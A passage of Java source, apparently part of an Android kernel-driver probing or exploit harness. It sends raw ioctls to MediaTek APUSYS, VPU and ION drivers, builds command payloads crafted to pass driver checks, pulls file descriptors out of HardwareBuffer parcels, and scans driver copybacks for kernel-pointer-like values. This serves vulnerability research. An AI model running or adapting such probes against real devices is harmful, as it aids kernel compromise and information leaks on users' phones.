        dumpByteBufferRange("vpu_cmd_" + phase + "_request_head",
            buf, VPU_REQUEST_OFF, 0xc0);
        dumpVpuRequestSummary("vpu_cmd_" + phase + "_request_summary", buf);
        dumpByteBufferRange("vpu_cmd_" + phase + "_request_tail",
            buf, VPU_REQUEST_OFF + 0xb40, 0x30);
    }

    private static byte[] snapshotByteBufferRange(java.nio.ByteBuffer buf,
                                                  int off,
                                                  int len) {
        int start = off < 0 ? 0 : off;
        int end = start + len;
        if (end < start || end > buf.capacity()) {
            end = buf.capacity();
        }
        byte[] out = new byte[end - start];
        for (int i = 0; i < out.length; i++) {
            out[i] = buf.get(start + i);
        }
        return out;
    }

    private static void dumpVpuCommandRequestDiff(String name,
                                                  byte[] before,
                                                  java.nio.ByteBuffer after,
                                                  int iovaLow,
                                                  int iovaSize) {
        if (before == null) {
            System.out.println("    " + name + ": unavailable before snapshot");
            return;
        }
        if (after.capacity() < VPU_REQUEST_OFF + before.length) {
            System.out.println("    " + name + ": unavailable cap="
                + after.capacity() + " before_len=0x"
                + Integer.toHexString(before.length));
            return;
        }

        int dwordChanges = 0;
        System.out.println("    " + name + "_dwords:");
        for (int off = 0; off + 3 < before.length; off += 4) {
            int oldVal = getU32LE(before, off);
            int newVal = getU32LE(after, VPU_REQUEST_OFF + off);
            if (oldVal != newVal) {
                dwordChanges++;
                System.out.println("      +0x" + Integer.toHexString(off)
                    + ": 0x" + Integer.toHexString(oldVal)
                    + " -> 0x" + Integer.toHexString(newVal)
                    + " [" + classifyCopybackDword(
                        off, newVal, iovaLow, iovaSize) + "]");
            }
        }
        if (dwordChanges == 0) {
            System.out.println("      no changed dwords");
        }

        int qwordChanges = 0;
        System.out.println("    " + name + "_qwords:");
        for (int off = 0; off + 7 < before.length; off += 8) {
            long oldVal = getU64LE(before, off);
            long newVal = getU64LE(after, VPU_REQUEST_OFF + off);
            if (oldVal != newVal) {
                qwordChanges++;
                System.out.println("      +0x" + Integer.toHexString(off)
                    + ": 0x" + Long.toHexString(oldVal)
                    + " -> 0x" + Long.toHexString(newVal)
                    + " [" + classifyCopybackQword(newVal) + "]");
            }
        }
        if (qwordChanges == 0) {
            System.out.println("      no changed qwords");
        }
        System.out.println("    " + name + "_summary: dword_changes="
            + dwordChanges + " qword_changes=" + qwordChanges);
    }

    private static String classifyCopybackDword(int off, int value,
                                                int iovaLow,
                                                int iovaSize) {
        long unsigned = value & 0xffffffffL;
        long start = iovaLow & 0xffffffffL;
        long end = start + (iovaSize & 0xffffffffL);
        if (iovaSize > 0 && unsigned >= start && unsigned < end) {
            return "imported-iova+0x" + Long.toHexString(unsigned - start);
        }
        if (off == 0x34) {
            return "request-result-status";
        }
        if (off == 0xb60 || off == 0xb64 || off == 0xb68 || off == 0xb6c) {
            return "tail-status-slot-or-provider-ret";
        }
        if ((unsigned & 0xffff0000L) == 0xffffff00L
                || (unsigned & 0xff000000L) == 0xc0000000L) {
            return "pointer-like-low32";
        }
        if (value == 0) {
            return "zero";
        }
        return "scalar";
    }

    private static String classifyCopybackQword(long value) {
        if (value == 0) {
            return "zero";
        }
        if ((value & 0xffff000000000000L) == 0xffff000000000000L
                || (value & 0xffffff0000000000L) == 0xffffff0000000000L) {
            return "kernel-pointer-like";
        }
        if ((value >>> 32) == 0) {
            return "low32-scalar";
        }
        return "scalar-or-packed";
    }

    private static void dumpVpuRequestSummary(String name,
                                              java.nio.ByteBuffer buf) {
        final int reqBase = VPU_REQUEST_OFF;
        final int reqSize = VPU_REQUEST_SIZE;
        if (buf.capacity() < reqBase + reqSize) {
            System.out.println("    " + name + ": unavailable cap="
                + buf.capacity());
            return;
        }

        long flags = getU64LE(buf, reqBase + 0x28);
        int resultStatus = buf.get(reqBase + 0x34) & 0xff;
        int bufferCount = buf.get(reqBase + 0x35) & 0xff;
        int settingsLen = getU32LE(buf, reqBase + 0x38);
        long settingsIova = getU64LE(buf, reqBase + 0x40);
        int slot = getU32LE(buf, reqBase + 0xb68);
        int algoRet = getU32LE(buf, reqBase + 0xb6c);

        System.out.println("    " + name
            + ": flags=0x" + Long.toHexString(flags)
            + " result_status=0x" + Integer.toHexString(resultStatus)
            + " buffer_count=0x" + Integer.toHexString(bufferCount)
            + " settings_len=0x" + Integer.toHexString(settingsLen)
            + " settings_iova=0x" + Long.toHexString(settingsIova)
            + " slot_b68=0x" + Integer.toHexString(slot)
            + " algo_ret_b6c=0x" + Integer.toHexString(algoRet));
    }

    private static void dumpByteBuffer(String name, java.nio.ByteBuffer buf,
                                        int len) {
        dumpByteBufferRange(name, buf, 0, len);
    }

    private static void dumpByteBufferRange(String name, java.nio.ByteBuffer buf,
                                            int off, int len) {
        int start = off < 0 ? 0 : off;
        int end = start + len;
        if (end < start || end > buf.capacity()) {
            end = buf.capacity();
        }
        StringBuilder sb = new StringBuilder();
        sb.append("    ").append(name)
          .append("[0x").append(Integer.toHexString(start)).append("]:");
        for (int i = start; i + 3 < end; i += 4) {
            int val = (buf.get(i) & 0xff)
                | ((buf.get(i + 1) & 0xff) << 8)
                | ((buf.get(i + 2) & 0xff) << 16)
                | ((buf.get(i + 3) & 0xff) << 24);
            sb.append(" [").append(i - start).append("]=0x")
              .append(Integer.toHexString(val));
        }
        System.out.println(sb.toString());
    }

    private static void fillRunCmdSubcommand(android.media.Image image,
                                             int scType,
                                             int codebufSize,
                                             int codebufOffset,
                                             String label) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x1000 ? buffer.capacity() : 0x1000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }
        if (buffer.capacity() < 0x80) {
            throw new IllegalStateException("input image too small for APUSYS cmd header");
        }

        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
        buffer.put(0x10, (byte) 1);       // version
        buffer.put(0x11, (byte) 0);       // priority
        putU64LE(buffer, 0x18, 0);        // flags
        putU32LE(buffer, 0x20, 1);        // num_sc
        putU32LE(buffer, 0x24, 0x5c);     // ofs_scr_list
        putU32LE(buffer, 0x28, 0x58);     // ofs_pdr_cnt_list
        putU32LE(buffer, 0x2c, 0x30);     // sc0 offset

        putU32LE(buffer, 0x30, scType);   // subcommand type
        buffer.put(0x1a + 0x30, (byte) 0); // pack_id
        putU32LE(buffer, 0x1c + 0x30, 0); // mem_ctx
        putU32LE(buffer, 0x20 + 0x30, codebufSize); // cb_info_size
        putU32LE(buffer, 0x24 + 0x30, codebufOffset); // ofs_cb_info
        putU32LE(buffer, 0x58, 0);        // pdr_cnt_list[0]
        putU32LE(buffer, 0x5c, 0);        // scr_list[0]

        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input run_cmd " + label + " payload:"
            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
            + " sc0_off=0x30 sc0_type=0x" + Integer.toHexString(scType)
            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
            + " pdr_cnt_off=0x58 scr_off=0x5c"
            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void fillRunCmdVpuExec(android.media.Image image,
                                          String algoName,
                                          String label) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }

        int codebufOffset = 0x60;
        int codebufSize = 0xb70;
        int totalNeeded = codebufOffset + codebufSize;
        if (buffer.capacity() < totalNeeded) {
            throw new IllegalStateException("input image too small: need 0x"
                + Integer.toHexString(totalNeeded) + " have "
                + buffer.capacity());
        }

        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
        buffer.put(0x10, (byte) 1);       // version
        buffer.put(0x11, (byte) 0);       // priority
        putU64LE(buffer, 0x18, 0);        // flags
        putU32LE(buffer, 0x20, 1);        // num_sc
        putU32LE(buffer, 0x24, 0x5c);     // ofs_scr_list
        putU32LE(buffer, 0x28, 0x58);     // ofs_pdr_cnt_list
        putU32LE(buffer, 0x2c, 0x30);     // sc0 offset

        int scOff = 0x30;
        putU32LE(buffer, scOff + 0x00, 0x03);  // type = normal VPU
        putU32LE(buffer, scOff + 0x04, 0);     // driver_time
        putU32LE(buffer, scOff + 0x08, 0);     // ip_time
        putU32LE(buffer, scOff + 0x0c, 0);     // suggest_time
        putU32LE(buffer, scOff + 0x10, 0);     // bandwidth
        putU32LE(buffer, scOff + 0x14, 0);     // tcm_usage
        buffer.put(scOff + 0x18, (byte) 0);    // tcm_force
        buffer.put(scOff + 0x19, (byte) 0);    // boost_val
        buffer.put(scOff + 0x1a, (byte) 0);    // pack_id
        putU32LE(buffer, scOff + 0x1c, 0);     // mem_ctx
        putU32LE(buffer, scOff + 0x20, codebufSize);     // cb_info_size
        putU32LE(buffer, scOff + 0x24, codebufOffset);   // ofs_cb_info
        putU32LE(buffer, 0x58, 0);        // pdr_cnt_list[0]
        putU32LE(buffer, 0x5c, 0);        // scr_list[0]

        // VPU request at codebufOffset (0x60): 0xb70 bytes
        // +0x04: algo name (NUL-terminated, up to 0x1f bytes)
        // +0x28: flags (u64), must be < 0x10; bit 2 selects execute_with_slot
        // +0x35: buffer_count byte, must be < 0x21
        // rest zeroed — minimal request to pass vpu_req_check
        int reqBase = codebufOffset;
        byte[] nameBytes = algoName.getBytes("US-ASCII");
        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
        for (int i = 0; i < nameLen; i++) {
            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
        }
        // +0x28 flags = 0 (walk vpu_execute, not vpu_execute_with_slot)
        // +0x35 buffer_count = 0
        // all other fields stay zero

        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input run_cmd " + label + " payload:"
            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
            + " sc0_off=0x30 sc0_type=0x3"
            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
            + " algo=" + algoName
            + " req_flags=0x0 req_buffer_count=0"
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void putU16LE(java.nio.ByteBuffer buffer, int off, int value) {
        buffer.put(off, (byte) (value & 0xff));
        buffer.put(off + 1, (byte) ((value >>> 8) & 0xff));
    }

    private static void putU32LE(java.nio.ByteBuffer buffer, int off, int value) {
        buffer.put(off, (byte) (value & 0xff));
        buffer.put(off + 1, (byte) ((value >>> 8) & 0xff));
        buffer.put(off + 2, (byte) ((value >>> 16) & 0xff));
        buffer.put(off + 3, (byte) ((value >>> 24) & 0xff));
    }

    private static void putU64LE(java.nio.ByteBuffer buffer, int off, long value) {
        for (int i = 0; i < 8; i++) {
            buffer.put(off + i, (byte) ((value >>> (8 * i)) & 0xff));
        }
    }

    private static int getU32LE(java.nio.ByteBuffer buffer, int off) {
        return (buffer.get(off) & 0xff)
            | ((buffer.get(off + 1) & 0xff) << 8)
            | ((buffer.get(off + 2) & 0xff) << 16)
            | ((buffer.get(off + 3) & 0xff) << 24);
    }

    private static int getU32LE(byte[] buffer, int off) {
        return (buffer[off] & 0xff)
            | ((buffer[off + 1] & 0xff) << 8)
            | ((buffer[off + 2] & 0xff) << 16)
            | ((buffer[off + 3] & 0xff) << 24);
    }

    private static long getU64LE(java.nio.ByteBuffer buffer, int off) {
        long value = 0;
        for (int i = 0; i < 8; i++) {
            value |= ((long) buffer.get(off + i) & 0xffL) << (8 * i);
        }
        return value;
    }

    private static long getU64LE(byte[] buffer, int off) {
        long value = 0;
        for (int i = 0; i < 8; i++) {
            value |= ((long) buffer[off + i] & 0xffL) << (8 * i);
        }
        return value;
    }

    private static void validateUcmdKey(String key) {
        if (key == null || key.length() == 0) {
            throw new IllegalArgumentException("--ucmd-key requires a non-empty key");
        }
        if (key.length() > 0x1f) {
            throw new IllegalArgumentException("--ucmd-key is limited to 31 ASCII bytes");
        }
        for (int i = 0; i < key.length(); i++) {
            char ch = key.charAt(i);
            if (ch < 0x20 || ch > 0x7e) {
                throw new IllegalArgumentException(
                    "--ucmd-key must contain printable ASCII only");
            }
        }
    }

    private static String sanitizeLabel(String text) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            char ch = text.charAt(i);
            if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z')
                    || (ch >= '0' && ch <= '9')) {
                out.append(ch);
            } else {
                out.append('_');
            }
        }
        return out.toString();
    }

    private static android.media.Image acquireImage(android.media.ImageReader reader)
            throws Exception {
        for (int i = 0; i < 20; i++) {
            android.media.Image image = reader.acquireNextImage();
            if (image != null) {
                System.out.println("[+] acquired image: width=" + image.getWidth()
                    + " height=" + image.getHeight()
                    + " format=" + image.getFormat()
                    + " timestamp=" + image.getTimestamp());
                return image;
            }
            Thread.sleep(50);
        }
        return null;
    }

    private static void dumpImageBytesIfNeeded(android.media.Image image,
                                               String label, int maxBytes) {
        if (image == null) {
            return;
        }
        try {
            android.media.Image.Plane[] planes = image.getPlanes();
            if (planes == null || planes.length == 0) {
                System.out.println("[-] " + label + ": image has no planes");
                return;
            }
            java.nio.ByteBuffer buffer = planes[0].getBuffer();
            int count = buffer.capacity() < maxBytes ? buffer.capacity() : maxBytes;
            StringBuilder hex = new StringBuilder();
            StringBuilder ascii = new StringBuilder();
            for (int i = 0; i < count; i++) {
                int value = buffer.get(i) & 0xff;
                if (i != 0) {
                    hex.append(' ');
                }
                if (value < 0x10) {
                    hex.append('0');
                }
                hex.append(Integer.toHexString(value));
                ascii.append(value >= 0x20 && value <= 0x7e ? (char) value : '.');
            }
            System.out.println("[*] " + label + " first_" + count + "_hex=" + hex);
            System.out.println("[*] " + label + " first_" + count + "_ascii=" + ascii);
        } catch (Throwable t) {
            System.out.println("[-] " + label + " dump failed: " + shortThrowable(t));
        }
    }

    private static void probeHardwareBufferParcel(int apusysFd,
                                                  android.hardware.HardwareBuffer hb,
                                                  boolean runUcmd,
                                                  boolean runRunCmd,
                                                  String prefix)
            throws Exception {
        probeHardwareBufferParcel(apusysFd, hb, runUcmd, runRunCmd, prefix, null);
    }

    private static void probeHardwareBufferParcel(int apusysFd,
                                                  android.hardware.HardwareBuffer hb,
                                                  boolean runUcmd,
                                                  boolean runRunCmd,
                                                  String prefix,
                                                  android.media.Image imageToDump)
            throws Exception {
        android.os.Parcel parcel = android.os.Parcel.obtain();
        try {
            hb.writeToParcel(parcel, 0);
            int size = parcel.dataSize();
            System.out.println("[*] HardwareBuffer parcel: dataSize=" + size
                + " hasFd=" + parcel.hasFileDescriptors()
                + " describe=0x" + Integer.toHexString(hb.describeContents()));

            tryReadAidlHardwareBuffer(apusysFd, parcel);
            bruteReadParcelFds(apusysFd, parcel, size, runUcmd, runRunCmd,
                prefix, imageToDump);
        } finally {
            parcel.recycle();
        }
    }

    private static void loadRuntimeLibraries() {
        String[] libs = {
            "/apex/com.android.art/lib64/libnativehelper.so",
            "/system/lib64/libhidlbase.so",
            "/system/lib64/libhidltransport.so",
            "/system/lib64/libui.so",
            "/system/lib64/libgui.so",
            "/system/lib64/libhwui.so",
            "/system/lib64/libandroid_runtime.so"
        };
        for (int i = 0; i < libs.length; i++) {
            try {
                System.load(libs[i]);
                System.out.println("[+] loaded " + libs[i]);
            } catch (Throwable t) {
                System.out.println("[-] load " + libs[i] + " failed: " + shortThrowable(t));
            }
        }
    }

    private static void tryReadAidlHardwareBuffer(int apusysFd, android.os.Parcel parcel)
            throws Exception {
        try {
            Class<?> hbClass = Class.forName("android.hardware.graphics.common.HardwareBuffer");
            Object aidlHb = hbClass.getDeclaredConstructor().newInstance();
            java.lang.reflect.Method read = hbClass.getDeclaredMethod(
                "readFromParcel", android.os.Parcel.class);
            read.setAccessible(true);
            parcel.setDataPosition(0);
            read.invoke(aidlHb, parcel);
            System.out.println("[+] AIDL HardwareBuffer readFromParcel succeeded");
            dumpObjectFields("aidl_hardware_buffer", aidlHb, 0);
            importFdsFromObject(apusysFd, "aidl_hwb", aidlHb, 0);
        } catch (Throwable t) {
            System.out.println("[-] AIDL HardwareBuffer parse failed: " + shortThrowable(t));
        }
    }

    private static void bruteReadParcelFds(int apusysFd, android.os.Parcel parcel,
                                           int size, boolean runUcmd,
                                           boolean runRunCmd, String prefix,
                                           android.media.Image imageToDump)
            throws Exception {
        boolean found = false;
        int limit = size < 0x1000 ? size : 0x1000;
        for (int pos = 0; pos < limit; pos += 4) {
            try {
                parcel.setDataPosition(pos);
                android.os.ParcelFileDescriptor pfd = parcel.readFileDescriptor();
                if (pfd == null) {
                    continue;
                }
                int fd = pfd.getFd();
                System.out.println("[+] parcel_fd_pos_" + pos + " fd=" + fd);
                found = true;
                String mem2Name = memProbeName(prefix, 2, pos);
                String mem3Name = memProbeName(prefix, 3, pos);
                boolean mem2Ok = runMemCreateWithFd(apusysFd, mem2Name,
                    APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, fd, 0x4000);
                boolean mem3Ok = runMemCreateWithFd(apusysFd, mem3Name,
                    APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, fd, 0x4000);
                if (runUcmd && (mem2Ok || mem3Ok)) {
                    String dumpBase = prefix + "_pos" + pos;
                    dumpImageBytesIfNeeded(imageToDump,
                        "payload_before_c0_" + dumpBase, 0x40);
                    runUcmdWithFd(apusysFd, "ucmd_" + prefix + "_c0_pos" + pos,
                        3, 0, fd, 0, 0x1000);
                    dumpImageBytesIfNeeded(imageToDump,
                        "payload_after_c0_" + dumpBase, 0x40);
                    runUcmdWithFd(apusysFd, "ucmd_" + prefix + "_c1_pos" + pos,
                        3, 1, fd, 0, 0x1000);
                    dumpImageBytesIfNeeded(imageToDump,
                        "payload_after_c1_" + dumpBase, 0x40);
                }
                if (runRunCmd && (mem2Ok || mem3Ok)) {
                    runRunCmdWithFd(apusysFd,
                        "run_async_" + prefix + "_pos" + pos, fd, 0, 0x4000);
                }
                pfd.close();
            } catch (Throwable ignored) {
                // Most parcel offsets are not file-descriptor objects.
            }
        }
        if (!found) {
            System.out.println("[-] No ParcelFileDescriptor could be read from HardwareBuffer parcel");
        }
    }

    private static String memProbeName(String prefix, int type, int pos) {
        if ("hwb".equals(prefix)) {
            return "hwb" + type + "_pos" + pos;
        }
        return prefix + "_mem" + type + "_pos" + pos;
    }

    private static long runRunCmdWithFd(int apusysFd, String name, int fd,
                                        int offset, int length) throws Exception {
        long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
        DrmTrigger.zeroMem(runCmd, 0x18);
        DrmTrigger.unsafePutInt(runCmd + 0x08, fd);
        DrmTrigger.unsafePutInt(runCmd + 0x0c, offset);
        DrmTrigger.unsafePutInt(runCmd + 0x10, length);
        return ioctlAndPrint(apusysFd, name, APUSYS_CMD_RUN_ASYNC, runCmd);
    }

    private static void importFdsFromObject(int apusysFd, String prefix,
                                            Object obj, int depth) throws Exception {
        if (obj == null || depth > 4) {
            return;
        }

        if (obj instanceof android.os.ParcelFileDescriptor) {
            int fd = ((android.os.ParcelFileDescriptor) obj).getFd();
            System.out.println("[+] " + prefix + "_pfd fd=" + fd);
            runMemCreateWithFd(apusysFd, prefix + "_mem2",
                APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, fd, 0x4000);
            runMemCreateWithFd(apusysFd, prefix + "_mem3",
                APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, fd, 0x4000);
            return;
        }

        Class<?> cls = obj.getClass();
        if (cls.isArray()) {
            int len = java.lang.reflect.Array.getLength(obj);
            for (int i = 0; i < len; i++) {
                importFdsFromObject(apusysFd, prefix + "_" + i,
                    java.lang.reflect.Array.get(obj, i), depth + 1);
            }
            return;
        }

        java.lang.reflect.Field[] fields = cls.getDeclaredFields();
        for (int i = 0; i < fields.length; i++) {
            java.lang.reflect.Field f = fields[i];
            f.setAccessible(true);
            try {
                Object value = f.get(obj);
                importFdsFromObject(apusysFd, prefix + "_" + f.getName(),
                    value, depth + 1);
            } catch (Throwable ignored) {
            }
        }
    }

    private static void dumpClassShape(String name) {
        try {
            Class<?> cls = Class.forName(name);
            System.out.println("[+] class " + name + " present");
            java.lang.reflect.Field[] fields = cls.getDeclaredFields();
            for (int i = 0; i < fields.length && i < 12; i++) {
                System.out.println("    field " + fields[i].toString());
            }
            java.lang.reflect.Method[] methods = cls.getDeclaredMethods();
            for (int i = 0; i < methods.length && i < 12; i++) {
                System.out.println("    method " + methods[i].toString());
            }
        } catch (Throwable t) {
            System.out.println("[-] class " + name + " unavailable: " + shortThrowable(t));
        }
    }

    private static void dumpObjectFields(String label, Object obj, int depth) {
        if (obj == null || depth > 3) {
            return;
        }
        Class<?> cls = obj.getClass();
        System.out.println("    " + label + " class=" + cls.getName());
        java.lang.reflect.Field[] fields = cls.getDeclaredFields();
        for (int i = 0; i < fields.length && i < 16; i++) {
            java.lang.reflect.Field f = fields[i];
            f.setAccessible(true);
            try {
                Object value = f.get(obj);
                System.out.println("    " + label + "." + f.getName()
                    + "=" + fieldValue(value));
                if (value != null && !isSimpleValue(value)) {
                    dumpObjectFields(label + "." + f.getName(), value, depth + 1);
                }
            } catch (Throwable t) {
                System.out.println("    " + label + "." + f.getName()
                    + "=<" + shortThrowable(t) + ">");
            }
        }
    }

    private static boolean isSimpleValue(Object value) {
        return value instanceof String
            || value instanceof Number
            || value instanceof Boolean
            || value.getClass().isPrimitive();
    }

    private static String fieldValue(Object value) {
        if (value == null) {
            return "null";
        }
        Class<?> cls = value.getClass();
        if (!cls.isArray()) {
            return value.toString();
        }
        return cls.getComponentType().getName() + "[" + java.lang.reflect.Array.getLength(value) + "]";
    }

    private static String optionalIntMethod(Object obj, String name) {
        try {
            java.lang.reflect.Method method = obj.getClass().getMethod(name);
            Object value = method.invoke(obj);
            return String.valueOf(value);
        } catch (Throwable t) {
            return "<" + shortThrowable(t) + ">";
        }
    }

    private static String optionalLongMethod(Object obj, String name) {
        try {
            java.lang.reflect.Method method = obj.getClass().getMethod(name);
            Object value = method.invoke(obj);
            if (value instanceof Number) {
                return "0x" + Long.toHexString(((Number) value).longValue());
            }
            return String.valueOf(value);
        } catch (Throwable t) {
            return "<" + shortThrowable(t) + ">";
        }
    }

    private static String shortThrowable(Throwable t) {
        Throwable cause = t;
        if (t instanceof java.lang.reflect.InvocationTargetException
                && ((java.lang.reflect.InvocationTargetException) t).getTargetException() != null) {
            cause = ((java.lang.reflect.InvocationTargetException) t).getTargetException();
        }
        return cause.getClass().getName() + ": " + cause.getMessage();
    }

    private static int ionAlloc(int ionFd, int heapMask, int size) throws Exception {
        long alloc = DrmTrigger.sScratchBuf + OFF_ION_ALLOC;
        DrmTrigger.zeroMem(alloc, 0x20);
        DrmTrigger.unsafePutLong(alloc + 0x00, size);
        DrmTrigger.unsafePutLong(alloc + 0x08, 0);       // align
        DrmTrigger.unsafePutInt(alloc + 0x10, heapMask);
        DrmTrigger.unsafePutInt(alloc + 0x14, 0);        // flags

        long ret = DrmTrigger.rawIoctl(ionFd, ION_IOC_ALLOC, alloc);
        int handle = ret >= 0 ? DrmTrigger.unsafeGetInt(alloc + 0x18) : 0;
        System.out.println("[*] ion_alloc_hmask_0x" + Integer.toHexString(heapMask)
            + " cmd=0x" + Long.toHexString(ION_IOC_ALLOC)
            + " ret=" + retText(ret)
            + (handle != 0 ? " handle=" + handle : ""));
        return ret >= 0 ? handle : 0;
    }

    private static int ionShare(int ionFd, int handle) throws Exception {
        long share = DrmTrigger.sScratchBuf + OFF_ION_SHARE;
        DrmTrigger.zeroMem(share, 0x08);
        DrmTrigger.unsafePutInt(share + 0x00, handle);

        long ret = DrmTrigger.rawIoctl(ionFd, ION_IOC_SHARE, share);
        int fd = ret >= 0 ? DrmTrigger.unsafeGetInt(share + 0x04) : -1;
        System.out.println("[*] ion_share        cmd=0x"
            + Long.toHexString(ION_IOC_SHARE)
            + " ret=" + retText(ret)
            + (fd >= 0 ? " fd=" + fd : ""));
        return ret >= 0 ? fd : -1;
    }

    private static void ionFree(int ionFd, int handle) throws Exception {
        long free = DrmTrigger.sScratchBuf + OFF_ION_FREE;
        DrmTrigger.zeroMem(free, 0x04);
        DrmTrigger.unsafePutInt(free + 0x00, handle);

        long ret = DrmTrigger.rawIoctl(ionFd, ION_IOC_FREE, free);
        System.out.println("[*] ion_free         cmd=0x"
            + Long.toHexString(ION_IOC_FREE)
            + " ret=" + retText(ret));
    }

    private static boolean runMemCreateWithFd(int fd, String name, long createCmd,
                                              long freeCmd, int dmaBufFd, long size)
            throws Exception {
        long mem = DrmTrigger.sScratchBuf + OFF_MEM_DMABUF;
        int importSize = size >= 0x1000 ? 0x1000 : (int) size;
        DrmTrigger.zeroMem(mem, 0x38);
        DrmTrigger.unsafePutInt(mem + 0x0c, importSize);
        DrmTrigger.unsafePutInt(mem + 0x10, 0);  // page-aligned offset
        DrmTrigger.unsafePutInt(mem + 0x14, 0);  // no alignment override
        DrmTrigger.unsafePutInt(mem + 0x18, 0);  // memory type accepted by mdw_mem_ion_check
        DrmTrigger.unsafePutInt(mem + 0x20, dmaBufFd);

        long ret = ioctlAndPrint(fd, name, createCmd, mem);
        if (ret >= 0) {
            dumpU32Words(name + "_desc", mem, 0x38);
        }
        cleanupMemSuccess(fd, name, freeCmd, mem, ret);
        return ret >= 0;
    }

    private static void cleanupMemSuccess(int fd, String name, long freeCmd,
                                          long mem, long ret) throws Exception {
        if (ret < 0) {
            return;
        }

        long id = DrmTrigger.unsafeGetLong(mem + 0x28);
        System.out.println("[+] " + name + " succeeded; id=0x"
            + Long.toHexString(id) + ", cleaning up");
        ioctlAndPrint(fd, name + "_cleanup", freeCmd, mem);
    }

    private static long ioctlAndPrint(int fd, String name, long cmd, long arg)
            throws Exception {
        long ret = DrmTrigger.rawIoctl(fd, cmd, arg);
        System.out.println("[*] " + pad(name, 18)
            + " cmd=0x" + Long.toHexString(cmd)
            + " ret=" + retText(ret));
        return ret;
    }

    private static void dumpU32Words(String name, long addr, int len)
            throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("    ").append(name).append(":");
        for (int off = 0; off < len; off += 4) {
            sb.append(" [").append(off).append("]=0x")
              .append(Integer.toHexString(DrmTrigger.unsafeGetInt(addr + off)));
        }
        System.out.println(sb.toString());
    }

    private static String retText(long ret) {
        if (ret >= 0) {
            return Long.toString(ret);
        }
        return ret + " (" + errnoName(-ret) + ")";
    }

    private static String errnoName(long errno) {
        if (errno == 1) return "EPERM";
        if (errno == 2) return "ENOENT";
        if (errno == 5) return "EIO";
        if (errno == 9) return "EBADF";
        if (errno == 12) return "ENOMEM";
        if (errno == 13) return "EACCES";
        if (errno == 14) return "EFAULT";
        if (errno == 16) return "EBUSY";
        if (errno == 19) return "ENODEV";
        if (errno == 22) return "EINVAL";
        if (errno == 25) return "ENOTTY";
        if (errno == 75) return "EOVERFLOW";
        if (errno == 95) return "EOPNOTSUPP";
        if (errno == 110) return "ETIMEDOUT";
        return "errno=" + errno;
    }

    private static String fdLabel(String path) {
        String s = path;
        if (s.startsWith("/dev/")) {
            s = s.substring(5);
        }
        return s.replace('/', '_').replace('-', '_').replace('.', '_');
    }

    private static String pad(String s, int width) {
        StringBuilder sb = new StringBuilder(s);
        while (sb.length() < width) {
            sb.append(' ');
        }
        return sb.toString();
    }
}
